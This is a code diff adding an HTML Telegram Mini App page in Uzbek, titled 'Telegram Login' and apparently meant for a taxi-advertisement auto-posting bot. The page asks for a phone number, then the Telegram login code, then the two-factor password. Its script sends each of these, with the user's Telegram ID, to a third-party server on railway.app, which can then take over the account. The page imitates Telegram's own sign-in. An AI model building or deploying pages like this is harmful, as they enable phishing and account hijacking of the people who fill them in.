@@ -1,1 +1,316 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<title>Telegram Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- Telegram Mini App SDK -->
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+:root {
+    --tg-bg: #0f172a;
+    --tg-card: #111827;
+    --tg-primary: #2ea6ff;
+    --tg-text: #e5e7eb;
+    --tg-muted: #9ca3af;
+    --tg-success: #22c55e;
+    --tg-error: #ef4444;
+}
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    background: var(--tg-bg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    color: var(--tg-text);
+}
+
+.container {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+}
+
+.card {
+    width: 100%;
+    max-width: 420px;
+    background: var(--tg-card);
+    border-radius: 18px;
+    padding: 24px;
+    box-shadow: 0 20px 40px rgba(0,0,0,.4);
+}
+
+.logo {
+    text-align: center;
+    font-size: 42px;
+    margin-bottom: 10px;
+}
+
+h1 {
+    text-align: center;
+    font-size: 22px;
+    margin-bottom: 6px;
+}
+
+.subtitle {
+    text-align: center;
+    font-size: 14px;
+    color: var(--tg-muted);
+    margin-bottom: 24px;
+}
+
+.step {
+    display: none;
+}
+
+.step.active {
+    display: block;
+}
+
+input {
+    width: 100%;
+    padding: 14px 16px;
+    border-radius: 12px;
+    border: none;
+    background: #020617;
+    color: var(--tg-text);
+    font-size: 16px;
+    outline: none;
+    margin-bottom: 14px;
+}
+
+input::placeholder {
+    color: #64748b;
+}
+
+button {
+    width: 100%;
+    padding: 14px;
+    border-radius: 12px;
+    border: none;
+    background: var(--tg-primary);
+    color: white;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+button:active {
+    transform: scale(0.98);
+}
+
+.info {
+    margin-top: 12px;
+    font-size: 13px;
+    color: var(--tg-muted);
+    text-align: center;
+}
+
+.footer {
+    margin-top: 20px;
+    font-size: 12px;
+    color: #475569;
+    text-align: center;
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+    <div class="card">
+
+        <div class="logo">🔐</div>
+        <h1>Telegram Login</h1>
+        <div class="subtitle">
+            Profilingizni ulab, avtoxabar yuboring
+        </div>
+
+        <!-- PHONE STEP -->
+        <div id="phoneStep" class="step active">
+            <input id="phone" placeholder="+998********">
+            <button type="button" id="sendBtn">📩 Kod yuborish</button>
+            <div class="info">
+                Telegram sizga tasdiqlash kodi yuboradi
+            </div>
+        </div>
+
+        <!-- CODE STEP -->
+        <div id="codeStep" class="step">
+            <input id="code" placeholder="Telegram kodi">
+            <button type="button" id="verifyBtn">✅ Tasdiqlash</button>
+            <div class="info">
+                Telegram’dan kelgan kodni kiriting
+            </div>
+        </div>
+
+        <!-- PASSWORD STEP -->
+        <div id="passwordStep" class="step">
+            <input id="password" type="password" placeholder="Telegram parol (2FA)">
+            <button type="button" id="passwordBtn">🔓 Kirish</button>
+            <div class="info">
+                Bu akkauntda 2 bosqichli himoya yoqilgan
+            </div>
+        </div>
+
+        <div class="footer">
+            Taksi e’lon beruvchi · Mini App
+        </div>
+    </div>
+</div>
+
+<script>
+const tg = window.Telegram.WebApp;
+tg.expand();      // FULLSCREEN
+tg.ready();
+
+const SERVER = "https://telegram-bots-production-af1b.up.railway.app";
+let phoneValue = "";
+
+function show(stepId) {
+    document.querySelectorAll(".step").forEach(s =>
+        s.classList.remove("active")
+    );
+    document.getElementById(stepId).classList.add("active");
+}
+
+/* ⬇️ MANA SHU JOYGA QO‘YASAN */
+function showMessage(type, text) {
+    if (type === "success") {
+        alert("✅ " + text);
+    } else if (type === "error") {
+        alert("❌ " + text);
+    } else {
+        alert(text);
+    }
+}
+
+// 📩 KOD YUBORISH
+async function sendCode() {
+    const phone = document.getElementById("phone").value.trim();
+    if (!phone) {
+        showMessage("error", "Telefon raqamni kiriting");
+        return;
+    }
+
+    phoneValue = phone;
+
+    const res = await fetch(SERVER, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            action: "send_code",
+            phone: phone
+        })
+    });
+
+    const data = await res.json();
+
+    if (data.status === "code_sent") {
+        show("codeStep");
+    } else if (data.status === "flood_wait") {
+        showMessage("error","Juda ko‘p urinish qilindi. " + data.seconds + " soniyadan keyin qayta urinib ko‘ring");
+    } else if (data.status === "phone_invalid") {
+        showMessage("error", "Telefon raqami noto‘g‘ri kiritildi");
+    } else if (data.status === "error") {
+        showMessage("error", "Kod yuborishda xatolik yuz berdi. Keyinroq urinib ko‘ring");
+    } else {
+        showMessage("error", "Noma’lum xatolik yuz berdi");
+    }
+}    
+
+// 📩 KOD TASDIQLASH
+async function verifyCode() {
+    const codeInput = document.getElementById("code");
+    if (!codeInput) {
+        alert("❌ Code input topilmadi");
+        return;
+    }
+
+    const code = codeInput.value.trim();
+    if (!code) {
+        showMessage("error", "Kodni kiriting");
+        return;
+    }
+
+    const res = await fetch(SERVER, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            action: "verify_code",
+            phone: phoneValue,
+            code: code,
+            user_id: Telegram.WebApp.initDataUnsafe?.user?.id
+        })
+
+    });
+
+    const data = await res.json();
+    
+    if (data.status === "success") {
+        showMessage("success", "Tizimga muvaffaqiyatli kirdingiz");
+        Telegram.WebApp.close();
+
+    } else if (data.status === "2fa_required") {
+        show("passwordStep");
+
+    } else if (data.status === "invalid_code") {
+        showMessage("error", "Tasdiqlash kodi noto‘g‘ri");
+
+    } else if (data.status === "no_code_requested") {
+        showMessage("error", "Avval telefon raqamingizga kod yuboring");
+
+    } else {
+        showMessage("error", "Tasdiqlashda xatolik yuz berdi");
+    }
+}
+
+// 🔓 2FA PAROL TEKSHIRISH
+async function verifyPassword() {
+    const password = document.getElementById("password").value.trim();
+
+    if (!password) {
+        showMessage("error", "Parolni kiriting");
+        return;
+    }
+
+    const res = await fetch(SERVER, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            action: "verify_password",
+            phone: phoneValue,
+            password: password,
+            user_id: Telegram.WebApp.initDataUnsafe?.user?.id
+        })
+    });
+
+    const data = await res.json();
+
+    if (data.status === "success") {
+        showMessage("success", "Tizimga muvaffaqiyatli kirdingiz");
+        Telegram.WebApp.close();
+
+    } else if (data.status === "invalid_password") {
+        showMessage("error", "Parol noto‘g‘ri kiritildi");
+
+    } else {
+        showMessage("error", "Kirishda xatolik yuz berdi");
+    }
+}
+
+document.getElementById("sendBtn").addEventListener("click", sendCode);
+document.getElementById("verifyBtn").addEventListener("click", verifyCode);
+document.getElementById("passwordBtn").addEventListener("click", verifyPassword);
+
+
+
+</script>
+</body>
+</html>
 
